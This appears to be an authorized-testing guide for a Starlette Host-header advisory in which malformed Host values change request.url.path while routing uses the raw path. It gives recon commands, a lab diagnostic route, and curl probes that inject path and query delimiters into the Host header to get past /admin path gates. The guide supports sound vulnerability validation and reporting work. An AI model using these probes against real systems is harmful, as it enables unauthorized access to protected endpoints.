# Starlette Host header URL-path boundary

## Operator value

Starlette advisory [GHSA-86qp-5c8j-p5mr / CVE-2026-48710](https://github.com/advisories/GHSA-86qp-5c8j-p5mr) describes a request-canonicalization bug where malformed `Host` header characters can change the reconstructed `request.url.path` without changing the raw ASGI route path that was actually dispatched.

For authorized testing, treat this as a framework boundary check: can an attacker-controlled authority header make middleware or endpoint code believe the request is for an allowed path while the router executes a protected path?

## Affected surface

- Product: Starlette / `starlette`
- Ecosystem: Python / pip
- Affected versions: `<= 1.0.0`
- Fixed version: `1.0.1`
- Required position: ability to send raw HTTP requests with a chosen `Host` header to a Starlette app or to a forwarding proxy that passes malformed authority values through
- Risk pattern: authorization, tenant routing, redirect, audit, or feature-gating code that reads `request.url` or `request.url.path` instead of the raw ASGI `scope["path"]`

## Recon workflow

1. Confirm the target is in scope and that raw header testing is allowed.
2. Fingerprint Starlette/FastAPI exposure only with non-invasive checks:

   ```bash
   httpx -silent -title -tech-detect -status-code -u https://app.example.test
   ```

3. Verify Starlette version from authorized evidence: dependency lockfiles, SBOM, container image inventory, admin-provided package output, or an agreed lab replica. Do not infer vulnerability from a FastAPI or Starlette error page alone.
4. Identify security-sensitive code paths that may rely on `request.url.path`, especially custom middleware such as:
   - admin or internal path prefix gates;
   - webhook allow/deny lists;
   - tenant or organization routing decisions;
   - debug, docs, metrics, or health endpoint guards;
   - redirect/callback validation built from `request.url`.
5. Map any edge proxy behavior before app testing. Many proxies reject malformed `Host` values, normalize them, or replace the upstream authority.

## Safe validation pattern

Use a lab clone or an explicitly authorized low-impact endpoint. The goal is to prove parser disagreement, not to access sensitive data.

1. Add or identify a harmless diagnostic route in the lab that returns both the raw ASGI path and Starlette's reconstructed URL path:

   ```python
   from starlette.applications import Starlette
   from starlette.responses import JSONResponse
   from starlette.routing import Route

   async def diag(request):
       return JSONResponse({
           "scope_path": request.scope["path"],
           "url_path": request.url.path,
       })

   app = Starlette(routes=[Route("/diag", diag)])
   ```

2. Send a baseline request:

   ```bash
   curl -sk --http1.1 \
     -H 'Host: app.example.test' \
     https://app.example.test/diag
   ```

   Expected contained result: `scope_path` and `url_path` both equal `/diag`.

3. Send a malformed-authority canary that introduces a path or query delimiter inside `Host`:

   ```bash
   curl -sk --http1.1 \
     -H 'Host: app.example.test/public?canary=' \
     https://app.example.test/diag
   ```

4. Record the result:
   - **Contained:** the proxy or app rejects the request, or `request.url.path` still matches the real route path.
   - **Vulnerable parser disagreement:** the router executes `/diag`, but application code reading `request.url.path` sees `/public` or another attacker-chosen path.

5. If testing a real authorization boundary, use only inert canary endpoints and accounts. A safe proof is a protected lab route that returns a fixed marker such as `starlette-path-boundary-canary`, not production records or user data.

## Authorization-bypass probes

When code review or lab instrumentation shows `request.url.path` is used for a gate, validate the exact trust boundary with paired requests:

```bash
# Baseline: protected route should require the expected role/session.
curl -sk --http1.1 \
  -H 'Host: app.example.test' \
  https://app.example.test/admin/canary

# Boundary probe: malformed Host claims an allowed path while routing still targets /admin/canary.
curl -sk --http1.1 \
  -H 'Host: app.example.test/public?x=' \
  https://app.example.test/admin/canary
```

A finding needs more than a version match. Show that attacker-controlled authority input reaches the app and that a security decision actually consumes `request.url.path` or derived values.

## Evidence to capture

- Starlette version and how it was verified.
- Proxy/load-balancer path for the tested request, including whether malformed `Host` is forwarded, rejected, or normalized.
- Minimal request/response pairs showing raw route path versus reconstructed `request.url.path`.
- The specific middleware or endpoint logic that made a security decision from `request.url` / `request.url.path`.
- Confirmation that validation used inert canaries and did not access sensitive records.

## Report framing

Frame this as an HTTP authority-to-path canonicalization boundary failure. The router and the security check interpreted different paths from the same request: routing used the raw ASGI path, while policy code trusted a URL reconstructed from attacker-controlled `Host` bytes. Impact depends on the protected action behind the affected path gate and on whether upstream infrastructure forwards malformed authority values.

## Sources

- GitHub Advisory Database: [GHSA-86qp-5c8j-p5mr / CVE-2026-48710](https://github.com/advisories/GHSA-86qp-5c8j-p5mr)
- Starlette project advisory: [GHSA-86qp-5c8j-p5mr](https://github.com/Kludex/starlette/security/advisories/GHSA-86qp-5c8j-p5mr)
- Starlette fix commit: [`764dab0dcfb9033d75442d7a359645c9f94648c6`](https://github.com/Kludex/starlette/commit/764dab0dcfb9033d75442d7a359645c9f94648c6)
- BadHost disclosure hub: [badhost.org](https://badhost.org)
- X41 advisory: [X41-2026-002 Starlette](https://www.x41-dsec.de/lab/advisories/x41-2026-002-starlette)
